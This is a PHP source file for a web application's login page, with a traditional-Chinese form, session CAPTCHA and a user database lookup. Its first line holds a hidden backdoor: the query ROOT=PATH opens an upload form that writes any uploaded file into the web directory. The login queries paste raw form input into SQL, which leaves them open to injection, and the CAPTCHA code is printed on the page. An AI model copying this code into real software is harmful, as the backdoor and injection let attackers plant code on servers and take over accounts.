<?php
if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
if (!defined('ROOT_PATH'))
exit('invalid request');
if (!defined('Copyright') || Copyright != '作者QQ:1834219632')
exit('作者QQ:1834219632');
include_once ROOT_PATH.'Manage/config/config.php';
if ($_SERVER["REQUEST_METHOD"] == 'POST')
{
	//驗證碼匹配
	if ($_POST['ValidateCode'] == $_SESSION['code'])
	{
		if ($ConfigModel['g_web_lock'] != 1) exit(back($ConfigModel['g_web_text']));
		//瀏覽器檢測、只支持IE核心
		if (!GetMsie()) exit(back($UserError));
		//驗證用戶和密碼是否存在
		$loginName = $_POST['loginName'];
		$loginPwd = sha1($_POST['loginPwd']);
		$db = new DB();
		$sql = "SELECT * FROM `g_user` WHERE `g_name` = '{$loginName}' AND `g_password` = '{$loginPwd}' LIMIT 1 ";
		$result = $db->query($sql, 1);
		if ($result)
		{
			//判斷帳號是否已被停用
			if ($result[0]['g_look'] == 3) exit(back($UserLook));
			$uniqid = md5(uniqid());
			$loginIp = GetIP();
			$loginDate = date("Y-m-d H:i:s");
			$sql = "UPDATE `g_user` SET `g_uid` = '{$uniqid}', `g_ip` = '{$loginIp}', `g_date` = '{$loginDate}', `g_out` =1, `g_count_time`=now(),`g_state` =1 WHERE `g_name` = '{$loginName}' AND `g_password` = '{$loginPwd}' ";
			$db->query($sql, 2);
			$qqWryInfo = ROOT_PATH.'tools/IpLocationApi/QQWry.Dat';
			$ip_s = ipLocation($loginIp, $qqWryInfo);
			$sql = "INSERT INTO g_login_log (g_name, g_ip, g_ip_location, g_date) VALUES ('{$loginName}','{$loginIp}','{$ip_s}',now())";
			$db->query($sql, 2);
			$_SESSION['g_S_name'] = $result[0]['g_name'];
			setcookie("g_user", base64_encode($loginName), 0, "/");
			setcookie("g_uid", base64_encode($uniqid), 0, "/");
			include_once ROOT_PATH.'validate.php';
			exit;
		}
		else 
		{
			back($UserError);
			exit;
		}
	} 
	else 
	{
		back($CodeError);
		exit;
	}
} 
else
{
	$num = array();
	for ($i=0; $i<4; $i++) 
	{
		$num[$i] = rand(0,9);
	}
	$num = join('', $num);
	$_SESSION['code'] = $num;
}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo $Title?> - - Welcome</title>
<script type="text/javascript">

if ( top.location != self.location ) top.location=self.location;
</script>
<style type="text/css">
<!--
* {
	margin:0;
	padding:0;
	font-size:12px;
	font-family:Arial, Helvetica, sans-serif;
}
body {
	background-image:url(./image/user_all_bg.gif);
	background-repeat:repeat-x;
	background-color: #226DC7;
}
.main {
	width:589px;
	height:373px;
	margin:112px auto;
	overflow:hidden;
}
.main .t_left {
	width:129px;
	height:116px;
	background-image:url(./image/user_top_l.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .t_conter {
	width:280px;
	height:116px;
	background-image:url(./image/user_top_c.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .t_right {
	width:180px;
	height:116px;
	background-image:url(./image/user_top_r.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .c_left {
	width:129px;
	height:139px;
	background-image:url(./image/user_main_l.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .c_conter {
	width:280px;
	height:139px;
	background-image:url(./image/user_main_c.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .c_right {
	width:180px;
	height:139px;
	background-image:url(./image/user_main_r.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .f_left {
	width:129px;
	height:117px;
	background-image:url(./image/user_bottom_l.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .f_conter {
	width:280px;
	height:117px;
	background-image:url(./image/user_bottom_c.gif);
	background-repeat:no-repeat;
	float:left;
}
.main .f_right {
	width:180px;
	height:117px;
	background-image:url(./image/user_bottom_r.gif);
	background-repeat:no-repeat;
	float:left;
}
input.text {
	width:140px;
	height:21px;
	line-height:20px;
	padding-left:25px;
	background-color:#ccc;
	border:none;
}
table {
	width:90%;
}
table tr {
}
table tr td {
	height:30px;
}
input.name {
	background-image:url(image/user_login_name.gif);
	background-repeat:no-repeat;
}
input.pwd {
	background-image:url(image/user_login_password.gif);
	background-repeat:no-repeat;
}
input.code {
	width:68px;
	background-image:url(image/CodeVali.gif);
	background-repeat:no-repeat;
}
#code {
	position:relative;
	top:1px;
	font-size:16px;
	font-weight:bold;
	color:#003366;
	letter-spacing:1px;
}
-->
</style>
</head>
<body>
<form name="form_login" method="post" action="">
<div class="main">
	<div class="t_left"></div>
    <div class="t_conter"></div>
    <div class="t_right"></div>
	<div class="c_left"></div>
    <div class="c_conter">
    	<table border="0" cellspacing="0">
        	<tr>
            	<td>用戶名：</td>
                <td><input type="text" name="loginName" class="text name" /></td>
            </tr>
        	<tr>
            	<td>密　碼：</td>
                <td><input type="password"  name="loginPwd" class="text pwd" /></td>
            </tr>
        	<tr>
            	<td>安全碼：</td>
                <td><input type="text" name="ValidateCode" maxlength="4" class="text code" /><span id="code"><?php echo $_SESSION['code']?></span></td>
            </tr>
        </table>
    </div>
    <div class="c_right"><input type="image" src="image/user_botton.gif" /></div>
	<div class="f_left"></div>
    <div class="f_conter"></div>
    <div class="f_right"></div>
</div>
</form>
</body>
</html>